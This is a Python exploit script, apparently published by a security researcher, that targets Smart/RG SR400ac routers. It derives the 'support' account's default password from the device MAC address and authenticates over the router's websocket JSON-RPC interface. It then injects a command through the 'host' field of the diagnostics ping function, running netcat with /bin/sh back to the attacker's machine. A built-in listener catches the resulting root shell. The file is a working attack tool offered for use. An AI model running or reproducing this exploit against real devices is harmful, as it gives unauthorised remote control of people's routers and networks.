
# Creator  	   : Ther3d0ne
# Website	   : thered0ne.com
# Date             : 2023-01-02
# Brand            : Smart/RG
# Affected ref.    : sr400ac
# Firmware         : 10.8.8.1/10.8.5.1 
# Python version   : 3.x (Linux)

import warnings

warnings.filterwarnings("ignore")

import hashlib
import string
import random
import crypt
import json
from websocket import create_connection
import fcntl, os, select, sys
import socket as S
import requests
import threading
import sys
import argparse

CLOSED_SOCK = "__CLOSED_SOCK__"

# -------------------------| Router's info |----------------------#

support_user = "support"
status_url = "/cgi-bin/status"

# ----------------------------------------------------------------#

def b2s(x):
    """convert bytes to str"""
    if isinstance(x, str):
        return x
    return x.decode("utf8")


def s2b(x):
    """convert str to bytes"""
    if isinstance(x, bytes):
        return x
    return x.encode("utf8")


def binread(s, n):
    """read bytes from stream"""
    if hasattr(s, "mode") and "b" in s.mode:
        return s.read(n)
    elif hasattr(s, "buffer"):
        return s.buffer.read(n)
    else:
        return s2b(s.read(n))


def binwrite(s, data):
    """write bytes to stream"""
    data += '\nroot #> '.encode()
    if hasattr(s, "mode") and "b" in s.mode:
        return s.write(data)
    elif hasattr(s, "buffer"):
        return s.buffer.write(data)
    else:
        return s.write(b2s(data))


def set_nonblocking(fd):
    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)


def server(port):
    set_nonblocking(get_io()[0].fileno())
    sock = create_socket()
    sock.setsockopt(S.SOL_SOCKET, S.SO_REUSEADDR, 1)
    sock.bind(("", int(port)))
    sock.listen(1)
    clientsock, _ = sock.accept()
    print("\033[0;32m[*]\033[0m Access granted!\n")
    print("--------------| Run your first cmd |----------------\n")
    handle_io(clientsock)


def create_socket():
    return S.socket(S.AF_INET, S.SOCK_STREAM)


def handle_io(sock):
    i, o = get_io()
    try:
        while True:
            sin = [sock, i]  # if (not udp or addr) and not i.closed else [sock]
            rs, _, _ = select.select(sin, [], [])

            if sock in rs:
                data, _ = sock.recvfrom(4096)

                if not data:
                    return CLOSED_SOCK

                binwrite(o, data)
                o.flush()

            if i in rs:
                data = binread(i, 4096)
                sock.sendall(data)

    except ConnectionResetError:
        sys.exit()
    finally:
        sock.close()


def get_io():
    return sys.stdin, sys.stdout


def listen(port):
    try:
        print("\033[0;34m[*]\033[0m Waiting for the router...")
        server(port)
    except KeyboardInterrupt:
        return 1
    return 0

# --------------------------------| Exploitation |---------------------------------#

def asciiart():
    print("\n\n")
    print("██████╗  █████╗ ███████╗████████╗    ██████╗  ██████╗ ")
    print("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝    ██╔══██╗██╔════╝ ")
    print("██║  ██║███████║█████╗     ██║       ██████╔╝██║  ███╗")
    print("██║  ██║██╔══██║██╔══╝     ██║       ██╔══██╗██║   ██║")
    print("██████╔╝██║  ██║██║        ██║       ██║  ██║╚██████╔╝")
    print("╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝       ╚═╝  ╚═╝ ╚═════╝ ")

    print("Thered0ne.com - https://github.com/warber0x")
    print("\n\n")


def get_websocket(ip, port):
    print("\033[0;34m[*]\033[0m Connecting to the target...")
    ws = create_connection(f"ws://{ip}:{port}/websocket/")
    if not ws:
        print("\033[0;31m[!]\033[0m Couldn't connect to the router")
        return
    return ws


def md5crypt(password, salt):
    return crypt.crypt(password, f"$1${salt}$")


def build_unix_hash(password, salt, token):
    print("\033[0;34m[*]\033[0m Building encryption key...")
    sha = hashlib.sha1()
    pwhash = hashlib.sha1()
    pwhash.update(password.encode())
    sha.update(token.encode())
    sha.update(pwhash.hexdigest().encode())
    result = response(password, salt, token)
    return result


def response(password, salt, token):
    result = {}
    result["hash"] = md5crypt(password, salt)
    s = string.ascii_letters + string.digits
    result["challenge"] = "".join(random.choices(s, k=32))
    result["response"] = hashlib.md5(
        (result["challenge"] + token + result["hash"]).encode("utf-8")
    ).hexdigest()
    return result


def get_session_key(ws, challenge, response):
    print("\033[0;34m[*]\033[0m Getting session key from the router.")
    session_query = {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "login",
        "params": [support_user, response, challenge],
    }

    ws.send(json.dumps(session_query))
    session_result = json.loads(ws.recv())
    if "error" in session_result:
        print("\033[0;31m[!]\033[0m Password has been changed")
        sys.exit()
    return session_result["result"]["success"]


def get_challenge(ws):
    print("\033[0;34m[*]\033[0m Getting challenge...")
    challenge_query = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "challenge",
        "params": [support_user],
    }

    ws.send(json.dumps(challenge_query))
    challenge_result = json.loads(ws.recv())["result"]
    token = challenge_result["token"]
    salt = challenge_result["salt"]
    return token, salt


def get_mac_address(ip, port="80"):
    print("\033[0;34m[*]\033[0m Getting target data...")
    response = requests.get(f"http://{ip}:{port}{status_url}").json()
    device_mac = response["MFG_INFO"]["MFG_MAC"]
    return device_mac[9:]


def get_router_session(router_ip, router_port):
    ws = get_websocket(router_ip, router_port)
    if not ws:
        sys.exit()
    else:
        default_password = get_mac_address(router_ip, router_port)
        token, salt = get_challenge(ws)
        result = build_unix_hash(default_password, salt, token)
        session = get_session_key(ws, result["challenge"], result["response"])
        return ws, session


def exploit(device_ip, device_port, reverse_ip, reverse_port):

    ws, session_key = get_router_session(device_ip, device_port)
    if session_key:
        print("\033[0;34m[*]\033[0m Sending final payload...")
        cmd_inj = f"''>/dev/null & nc {reverse_ip} {reverse_port} -e /bin/sh &"
        ping_query = {
            "jsonrpc": "2.0",
            "id": 5,
            "method": "call",
            "params": [
                session_key,
                "/juci/smartrg.diagnostics",
                "ping",
                {"host": cmd_inj},
            ],
        }
        ws.send(json.dumps(ping_query))


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Router Smart/RG 0-day exploit")
    parser.add_argument(
        "-i", "--router-ip", type=str, required=True, help="IP address of the router"
    )
    parser.add_argument(
        "-p",
        "--router-port",
        type=int,
        default=80,
        help="Port number of the router <default=80>",
    )
    parser.add_argument(
        "-l",
        "--local-ip",
        type=str,
        required=True,
        help="Local/Public IP address of your machine",
    )
    parser.add_argument(
        "-r",
        "--local-port",
        type=int,
        required=True,
        help="Port number in your machine",
    )

    args = None
    try:
        args = parser.parse_args()
    except SystemExit:
        sys.exit()

    router_ip = args.router_ip
    router_port = args.router_port
    local_ip = args.local_ip
    local_port = args.local_port
    asciiart()
    thread = threading.Thread(target=listen, args=(local_port,))
    thread.start()
    exploit(router_ip, router_port, local_ip, local_port)
    thread.join()
